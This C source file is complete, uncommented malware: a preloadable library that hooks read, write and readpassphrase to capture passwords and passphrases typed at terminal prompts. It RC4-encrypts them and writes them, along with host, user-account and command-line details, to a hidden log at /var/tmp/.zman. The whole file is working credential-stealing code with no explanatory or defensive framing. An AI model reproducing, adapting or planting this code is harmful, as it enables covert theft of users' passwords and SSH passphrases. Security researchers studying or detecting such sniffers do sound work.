#include <errno.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/utsname.h>
#include <pwd.h>

#ifdef SOLARIS
#include <sys/systeminfo.h>
#endif

#define LOG "/var/tmp/.zman"
#define swap_byte(x,y) t = *(x); *(x) = *(y); *(y) = t

typedef void (*sighandler_t) (int);
static jmp_buf snowcrash;

typedef struct rc4_key_s
{
  unsigned char state[256];
  unsigned char x;
  unsigned char y;
} rc4_key_t;

static char string_passwd[BUFSIZ];
static char *p_string_passwd;
static int fd_log = -1;
static int n_read = 0;
static int is_a_passwd_or_passphrase = -1;
static rc4_key_t key;
extern char **environ;

static void
snowcrash_handler (int signum)
{
  longjmp (snowcrash, signum);
}

void
prepare_key (unsigned char *key_data_ptr, int key_data_len, rc4_key_t * key)
{
  unsigned char t;
  unsigned char index1;
  unsigned char index2;
  unsigned char *state;
  short counter;

  state = &key->state[0];
  for (counter = 0; counter < 256; counter++)
    {
      state[counter] = counter;
    }
  key->x = 0;
  key->y = 0;
  index1 = 0;
  index2 = 0;
  for (counter = 0; counter < 256; counter++)
    {
      index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
      swap_byte (&state[counter], &state[index2]);
      index1 = (index1 + 1) % key_data_len;
    }
}

void
rc4 (unsigned char *buffer_ptr, int buffer_len, rc4_key_t * p_key)
{
  unsigned char t;
  unsigned char x;
  unsigned char y;
  unsigned char *state;
  unsigned char xorIndex;
  short counter;

  x = p_key->x;
  y = p_key->y;
  state = &p_key->state[0];
  for (counter = 0; counter < buffer_len; counter++)
    {
      x = (x + 1) % 256;
      y = (state[x] + y) % 256;
      swap_byte (&state[x], &state[y]);
      xorIndex = (state[x] + state[y]) % 256;
      buffer_ptr[counter] ^= state[xorIndex];
    }
  p_key->x = x;
  p_key->y = y;
}

static void
mkstemp_log (void)
{
  char template[] = LOG "XXXXXX";

  if (fd_log < 0)
    {
      fd_log = mkstemp (template);
    }
}

static void
write_log (void *buf, size_t count)
{
  if (fd_log < 0)
    {
      return;
    }

  rc4 (buf, count, &key);
  write (fd_log, buf, count);
}

static void
close_log (void)
{
  if (fd_log < 0)
    {
      return;
    }
  close (fd_log);
  fd_log = -1;
}

#ifndef RTLD_NEXT
#define RTLD_NEXT ( (void *)(-1) )
#endif

#ifdef FREEBSD

#define HOOK( var, string ) if ( var == NULL ) { var = (char*(*)())dlsym( RTLD_NEXT, string ); }	//if ( dlerror() != NULL ) { errno = -1; return( NULL ); } }

char *
readpassphrase (const char *prompt, char *buf, size_t bufsiz, int flags)
{
  static char *(*p_readpassphrase) () = NULL;
  char buffer[BUFSIZ];
  char *ret;
  size_t len;

  HOOK (p_readpassphrase, "readpassphrase");

  ret = p_readpassphrase (prompt, buf, bufsiz, flags);
  if ((ret != NULL) && ((len = strlen (ret)) > 0))
    {
      memset (buffer, '\0', sizeof (buffer));
      snprintf (buffer, sizeof (buffer), "[#] password: %s\n", ret);
      write_log (buffer, strlen (buffer));
      close_log ();
    }
  return ret;
}

#else

#define HOOK( var, string ) if ( var == NULL ) { var = (int(*)())dlsym( RTLD_NEXT, string ); if ( dlerror() != NULL ) { errno = -1; return( -1 ); } }

ssize_t
read (int fd, void *buf, size_t count)
{
  static int (*p_read) () = NULL;
  ssize_t ssize;
  char password[BUFSIZ];
  char *p_password;
  int i;

  HOOK (p_read, "read");

  ssize = p_read (fd, buf, count);
  if (ssize < 0)
    {
      return (ssize);
    }

  i = isatty (fd);
  if (i > 0)
    {
      if (n_read < 0)
	{
	  if (count < sizeof (string_passwd))
	    {
	      memcpy (p_string_passwd, buf, count);
	      p_string_passwd += count;
	    }
	  if (strstr (buf, "\n"))
	    {
	      n_read++;
	      p_password = password;

	      if (!is_a_passwd_or_passphrase)
		{
		  memcpy (p_password, "[#] password: ",
			  strlen ("[#] password: "));
		  p_password += strlen ("[#] password: ");
		}
	      else if (is_a_passwd_or_passphrase > 0)
		{
		  memcpy (p_password, "[#] passphrase: ",
			  strlen ("[#] passphrase: "));
		  p_password += strlen ("[#] passphrase: ");
		}

	      memcpy (p_password, string_passwd, strlen (string_passwd));
	      p_password += strlen (string_passwd);
	      memcpy (p_password, "\n", strlen ("\n"));
	      p_password += strlen ("\n");
	      *p_password = '\0';

	      write_log (password, strlen (password));

	      close_log ();
	    }
	}
    }
  return (ssize);
}

#ifndef FALSE
#   define FALSE (0)
#endif
#ifndef TRUE
#   define TRUE (1)
#endif

ssize_t
write (int fd, const void *buf, size_t count)
{
  static int (*p_write) () = NULL;
  ssize_t ssize;
  int i;

  p_string_passwd = string_passwd;

  HOOK (p_write, "write");

  ssize = p_write (fd, buf, count);
  if (ssize != count)
    {
      return (ssize);
    }

  i = isatty (fd);
  if (i > 0)
    {

      if (strstr (buf, "password"))
	{
	  is_a_passwd_or_passphrase = FALSE;
	  if (!n_read)
	    n_read--;
	}
      if (strstr (buf, "Password"))
	{
	  is_a_passwd_or_passphrase = FALSE;
	  if (!n_read)
	    n_read--;
	}
      if (strstr (buf, "passphrase"))
	{
	  is_a_passwd_or_passphrase = TRUE;
	  if (!n_read)
	    n_read--;
	}
    }

  return (ssize);
}

#endif

void
_init (void)
{
  char buffer[BUFSIZ];
  char *p_buffer;
  char **argv;
  struct utsname u;
  struct passwd *pp;
  int argc;
  static sighandler_t sigbus_handler = SIG_ERR;
  static sighandler_t sigsegv_handler = SIG_ERR;
  int i, size = 0;
  uid_t uid;

  i = setjmp (snowcrash);
  if (i)
    {
      goto leave_init;
    }

  sigbus_handler = signal (SIGBUS, snowcrash_handler);
  if (sigbus_handler == SIG_ERR)
    {
      goto leave_init;
    }
  sigsegv_handler = signal (SIGSEGV, snowcrash_handler);
  if (sigsegv_handler == SIG_ERR)
    {
      goto leave_init;
    }

  mkstemp_log ();
  prepare_key ("4ed1479a7a48653b13d492f52ecbe5d6",
	       strlen ("4ed1479a7a48653b13d492f52ecbe5d6"), &key);

  i = uname (&u);
  if (i == 0)
    {
      snprintf (buffer, sizeof (buffer), "[#] %s:%s:%s:%s:%s\n",
		u.sysname, u.nodename, u.release, u.version, u.machine);
      write_log (buffer, strlen (buffer));
    }

#ifdef SOLARIS
  {
    char sys[256];

    i = sysinfo (SI_HOSTNAME, sys, sizeof (sys));
    if (i > 0)
      {
	snprintf (buffer, sizeof (buffer), "[#] %s\n", sys);
      }
    write_log (buffer, strlen (buffer));
  }
#endif

  uid = getuid ();
  pp = getpwuid (uid);
  if (pp != NULL)
    {
      snprintf (buffer, sizeof (buffer), "[#] %s:%s:%u:%u:%s:%s:%s\n",
		pp->pw_name, pp->pw_passwd, pp->pw_uid, pp->pw_gid,
		pp->pw_gecos, pp->pw_dir, pp->pw_shell);
      write_log (buffer, strlen (buffer));
    }

  if (environ == NULL)
    {
      goto leave_init;
    }

  for (argc = 0, argv = environ - 2; *((int *) argv) != argc; argc++, argv--)
    {
      if (argc > 0x100)
	{
	  return;
	}
    }

  ++argv;

  p_buffer = buffer;


  memcpy (p_buffer, "[#]", strlen ("[#]"));
  p_buffer += strlen ("[#]");

  while (argc--)
    {
      i = snprintf (p_buffer, BUFSIZ - size, " %s", *argv++);
      if ((i < 0) || (i > BUFSIZ - size))
	{
	  i = BUFSIZ - 1;
	}
      else
	{
	  size += i;
	  p_buffer += i;
	}
    }

  memcpy (p_buffer, "\n", strlen ("\n"));
  p_buffer += strlen ("\n");
  *p_buffer = '\0';

  write_log (buffer, strlen (buffer));

leave_init:
  if (sigbus_handler != SIG_ERR)
    {
      signal (SIGBUS, sigbus_handler);
    }
  if (sigsegv_handler != SIG_ERR)
    {
      signal (SIGSEGV, sigsegv_handler);
    }
}
